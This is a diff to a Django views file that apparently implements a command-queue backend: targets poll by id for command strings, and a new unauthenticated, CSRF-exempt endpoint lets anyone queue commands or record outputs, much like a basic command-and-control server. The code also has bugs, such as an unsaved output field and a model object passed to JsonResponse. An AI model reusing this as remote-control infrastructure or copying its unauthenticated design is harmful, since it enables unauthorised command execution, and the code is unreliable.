@@ -44,6 +44,7 @@ if proc:
     def get(request, id):
         # Retrieve the latest Command object with the matching 'target' value
         command = get_object_or_404(Command, target=id, completed=False)
+        #command = Command.objects.get(Command, target=id, completed=False)
 
         return HttpResponse(command.command)
 
@@ -79,3 +80,32 @@ if proc:
         command = get_object_or_404(Command, target=id, completed=False)
 
         return HttpResponse(command.output)
+
+    #Interacting with controller:
+    @csrf_exempt
+    def get_controller_command(request):
+        if request.method == 'POST':
+            try:
+                #Loads data
+                data = json.loads(request.body.decode('utf-8'))
+                command_text = data.get('command')
+                id_text = data.get('id')
+                operation = data.get('operation')
+                number = data.get('number')
+                if command_text and id_text and operation and number is not None:
+                    if operation == "set":
+                        print("Command text: \n", command_text)
+                        print("ID text: \n", int(id_text))
+                        c = Command(completed=False, command=str(command_text), target=int(id_text))
+                        c.save()
+                        return JsonResponse({'message': 'String data received successfully'})
+                    elif operation == "get":
+                        c = Command.objects.get(target=int(id_text), completed=False, number=number)
+                        c.output = command_text
+                        return JsonResponse({"output": c})
+                else:
+                    return JsonResponse({'message': 'Invalid JSON data: Missing keys'}, status=400)
+            except json.JSONDecodeError as e:
+                return JsonResponse({'message': f'Invalid JSON data: {str(e)}'}, status=400)
+        else:
+            return JsonResponse({'message': 'Invalid request method'}, status=405)
